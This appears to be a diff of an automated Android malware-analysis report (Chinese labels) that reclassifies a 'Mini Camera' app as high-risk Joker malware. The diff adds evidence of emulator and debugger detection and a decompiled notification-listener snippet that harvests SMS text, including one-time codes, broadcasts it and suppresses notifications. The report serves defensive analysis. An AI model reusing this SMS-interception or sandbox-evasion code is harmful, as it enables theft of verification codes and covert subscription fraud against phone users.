@@ -4,19 +4,91 @@
     "sha256": "b36fbe6b75f00ae835156185ca5d6955cdfbe410d73c3e5653dabbaff260f166",
     "包名": "com.with.nofear.myheart",
     "应用名": "Mini Camera",
-    "是否恶意": false,
-    "风险等级": "低",
-    "分析耗时(秒)": 566.0
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1192.8
   },
-  "行为列表": [],
+  "行为列表": [
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_debug",
+          "中文名": "反调试",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "isDebuggerConnected"
+            ]
+          }
+        },
+        {
+          "子行为": "anti_emulator",
+          "中文名": "反模拟器",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "goldfish"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\umeng\\commonsdk\\internal\\utils\\l;",
+          "method_signature": "run()",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "strArr[0] = l.c(); strArr[1] = l.a(); strArr[2] = l.b(); l.b(context, strArr);",
+          "malicious_code_snippet_context": "strArr[0] = l.c(); strArr[1] = l.a(); strArr[2] = l.b(); l.b(context, strArr);",
+          "behavior_description": "该代码位于友盟(Umeng)统计SDK内部工具类中，在子线程中通过读取系统硬件特征采集设备指纹：磁盘类型(diskType)、温区(ThermalZone)、GoldFishRc。其中 Goldfish 是 Android 模拟器(QEMU/ranchu)特有的虚拟设备标识，结合磁盘类型与温区信息可判定当前运行环境是否为模拟器/沙箱；判定结果以字符串数组形式经 l.b() 写入应用 SharedPreferences 本地持久化。数据流向：读取 /sys、/proc 硬件特征信息(source) → 模拟器环境判定 → SharedPreferences 本地存储(sink)。该片段本身属于 Umeng SDK 过滤模拟器流量的常规逻辑，检测结果未直接外传；但在已确认恶意的 Joker 样本中，此类环境检测能力可辅助规避沙箱与动态分析，属于隐蔽SDK行为，构成间接风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\startapp\\android\\publish\\MeService;",
+          "method_signature": "a(Context context)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static void a(Context context) {\n    PackageManager packageManager = context.getPackageManager();\n    packageManager.setComponentEnabledSetting(new ComponentName(context, (Class<?>) MeService.class), 2, 1);\n    packageManager.setComponentEnabledSetting(new ComponentName(context, (Class<?>) MeService.class), 1, 1);\n}\n\npublic void onNotificationPosted(StatusBarNotification statusBarNotification) {\n    if (statusBarNotification.getPackageName().equals(Telephony.Sms.getDefaultSmsPackage(this))) {\n        CharSequence charSequence = statusBarNotification.getNotification().extras.getCharSequence(NotificationCompat.EXTRA_TEXT);\n        if (!TextUtils.isEmpty(charSequence)) {\n            Intent intent = new Intent(\"action_text\");\n            intent.putExtra(NotificationCompat.EXTRA_TEXT, charSequence.toString());\n        }\n    }\n}",
+          "malicious_code_snippet_context": "  \n  /* JADX INFO: loaded from: classes2.dex */\n  public class MeService extends NotificationListenerService {\n>>>     public static void a(Context context) {\n>>>         PackageManager packageManager = context.getPackageManager();\n>>>         packageManager.setComponentEnabledSetting(new ComponentName(context, (Class<?>) MeService.class), 2, 1);\n>>>         packageManager.setComponentEnabledSetting(new ComponentName(context, (Class<?>) MeService.class), 1, 1);\n>>>     }\n>>> \n>>>     @Override // android.service.notification.NotificationListenerService\n>>>     public void onNotificationPosted(StatusBarNotification statusBarNotification) {\n>>>         if (statusBarNotification.getPackageName().equals(Telephony.Sms.getDefaultSmsPackage(this))) {\n>>>             CharSequence charSequence = statusBarNotification.getNotification().extras.getCharSequence(NotificationCompat.EXTRA_TEXT);\n>>>             if (!TextUtils.isEmpty(charSequence)) {\n>>>                 Intent intent = new Intent(\"action_text\");\n>>>                 intent.putExtra(NotificationCompat.EXTRA_TEXT, charSequence.toString());\n>>>                 sendBroadcast(intent);\n>>>             }\n              cancelAllNotifications();\n          }\n      }",
+          "behavior_description": "该类是 Joker 木马伪装在 startapp 广告包路径下的短信窃取组件。a() 方法调用 setComponentEnabledSetting 对 MeService 组件先设为禁用(状态2)再立即启用(状态1)，并非典型的启动器图标隐藏，而是利用组件状态切换强制系统对 NotificationListenerService 进行解绑/重绑的保活技巧，确保短信监听持续生效、隐蔽存活；onNotificationPosted() 中判断通知来源为默认短信应用后，提取通知正文（即完整短信内容，含验证码 OTP），再通过 action_text 广播 Intent 将短信内容外传给木马其他组件（进而上传 C2，用于静默完成付费订阅欺诈）。数据流向：系统短信通知 → 提取 EXTRA_TEXT 短信正文 → 广播外发窃取；setComponentEnabledSetting 组件切换则保障该窃取链路持续运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
   "覆盖范围": {
     "静态分析": "完整",
     "动态分析": "未执行",
     "方法引用分析": "完整",
-    "JADX反编译": "未执行",
+    "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
